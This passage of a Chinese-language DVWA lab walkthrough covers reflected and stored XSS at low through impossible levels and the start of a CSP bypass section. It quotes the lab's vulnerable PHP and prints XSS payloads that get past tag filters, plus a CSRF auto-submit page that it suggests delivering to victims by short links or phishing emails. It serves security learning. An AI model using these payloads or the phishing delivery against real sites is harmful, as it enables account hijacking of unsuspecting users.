    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>过滤很全，将<script>标签中的每个字符都过滤了，但我们可以使用其他标签</p>
<pre><code class="hljs scss">&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-number">1</span> onerror=<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)
&lt;<span class="hljs-selector-tag">a</span> href = &#x27;javascript:<span class="hljs-built_in">alert</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>)<span class="hljs-string">&#x27;&gt;click&lt;/a&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210946716.png" alt="image-20240112210946716"></p>
<h2 id="Impossible-11">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );

    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;
&#125;
<span class="hljs-comment">// Generate Anti-CSRF token</span>
<span class="hljs-title function_ invoke__">generateSessionToken</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>防止CSRF，接着采用<code>htmlspecialchars</code>杜绝了特殊字符：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211143475.png" alt="image-20240112211143475"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211129022.png" alt="image-20240112211129022"></p>
<p>这意味着我们的任何事件标签都将无用</p>
<h1>0x12 XSS(Stored)</h1>
<h2 id="Low-12">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<span class="hljs-comment">//对字符串收尾去空</span>
    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<span class="hljs-comment">//取出反引号</span>
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>可以看见对用户的输入在经过几个函数的处理后，插入了数据库，但并未做出对xss的过滤，但防止SQL注入</p>
<pre><code class="hljs plaintext">&lt;script&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211743611.png" alt="image-20240112211743611"></p>
<p>可以看到当我们插入上述数据的时候，每当我们访问此页面，便会执行xss</p>
<h2 id="Medium-12">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );
    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>可以看到这回对message做出了成功的过滤，但却忘记正确过滤name，只是将<script>标签替换为空</p>
<p>但这里由于对Name这一文本框有字数限制，但我们可以放到bp上，或者直接F12在html中直接修改</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212232937.png" alt="image-20240112212232937"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212246035.png" alt="image-20240112212246035"></p>
<p>可以看到成功XSS，类似paylaod还有：</p>
<pre><code class="hljs scss">&lt;sc&lt;script&gt;ript&gt;<span class="hljs-built_in">alert</span>(XSS)&lt;/script&gt;
&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=x onerror=<span class="hljs-built_in">alert</span>(&#x27;XSS&#x27;)&gt;</code></pre>
<p>当然还可以：审查元素手动将 <code>maxlength</code> 的值调大一点就可以了。</p>
<h2 id="High-12">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里同样对message做出了严格的过滤，但对name只是单纯过滤了<script>标签，这并没有什么用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212626709.png" alt="image-20240112212626709"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212549693.png" alt="image-20240112212549693"></p>
<h2 id="Impossible-12">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$name</span> );

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );
    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );
    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );
    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
&#125;
<span class="hljs-comment">// Generate Anti-CSRF token</span>
<span class="hljs-title function_ invoke__">generateSessionToken</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>防止CSRF，SQL注入，同时对message与name的内容都做出了相同且严格的过滤，这是无法绕过的</p>
<h1>0x13 CSP Bypass</h1>
<p>内容安全策略（CSP）使服务器管理员可以通过指定浏览器应认为是可执行脚本的有效源的域来减少或消除XSS可能发生的向量。然后，兼容CSP的浏览器将仅执行从这些允许列出的域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理HTML属性）。</p>
<p>除了限制可以从中加载内容的域之外，服务器还可以指定允许使用哪些协议; 例如（理想情况下，从安全角度来看），服务器可以指定必须使用HTTPS加载所有内容。完整的数据传输安全策略不仅包括强制HTTPS进行数据传输，还包括使用安全标记标记所有cookie，并提供从HTTP页面到其HTTPS对应项的自动重定向。站点还可以使用Strict-Transport-SecurityHTTP标头来确保浏览器仅通过加密通道连接到它们。</p>
<p>两种方法可以启用 CSP。</p>
<ul>
<li>一种是通过 HTTP 头信息的Content-Security-Policy的字段。</li>
<li>一种是通过网页的<meta>标签</li>
</ul>
<h2 id="Low-13">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="hljs-comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span>

<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);

<span class="hljs-comment"># These might work if you can&#x27;t create your own for some reason</span>
<span class="hljs-comment"># https://pastebin.com/raw/R570EE00</span>
<span class="hljs-comment"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span>
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span>
<span class="hljs-string">    &lt;script src=&#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&gt;&lt;/script&gt;</span>
<span class="hljs-string">&quot;</span>;
&#125;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span>
<span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span>
<span class="hljs-string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span>
<span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span>
<span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&#x27;</span>;</code></pre>
<p>这里可以看到网站通过添加HTTP头信息的Content-Security-Policy的字段来开启CSP：<a target="_blank" rel="noopener" href="http://xn--pastebin-gq8mn0iju0dl0mivas85ctj0bj15alpd77ea6699apxw59d8q1dtnf.com">要求本页面只能加载来自自身的或者pastebin.com</a>, <a target="_blank" rel="noopener" href="http://hastebin.com">hastebin.com</a>, jquery and google analytics.这些网站的js脚本代码</p>
<p>其中 <a target="_blank" rel="noopener" href="http://pastebin.com">pastebin.com</a> 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句：</p>
<pre><code class="hljs scss">https://pastebin.com/raw/dtZzx4TF</code></pre>
<p>我们在上述网站构造XSS语句，之后记录下生成的网址，接着放入DVWA的文本输入框中，点击include即可触发XSS，但我这里不知为何没有反应</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113153131110.png" alt="image-20240113153131110"></p>
<p>这里还可以配合 CSRF 让攻击更加自动化：</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1:8888/vulnerabilities/csp/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;csp&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;include&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript">  <span class="hljs-keyword">var</span> form = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;csp&quot;</span>);</span>
<span class="language-javascript">  form[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>=<span class="hljs-string">&quot;https://pastebin.com/raw/ZFnbmjBU&quot;</span>;</span>
<span class="language-javascript">  form.<span class="hljs-title function_">submit</span>();</span>
<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p>将上述内容保存为 csrf.html 然后上传到公网服务器上</p>
<pre><code class="hljs scss">https://www.yourwebsite.com/csrf.html</code></pre>
<p>将这个地址想方设法让受害者访问的话，就会自动触发 CSRF 和 XSS 攻击。这里可以采用短网址、钓鱼邮件等方法</p>
<h2 id="Medium-13">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);

<span class="hljs-comment">// Disable XSS protections so that inline alert boxes will work</span>
<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
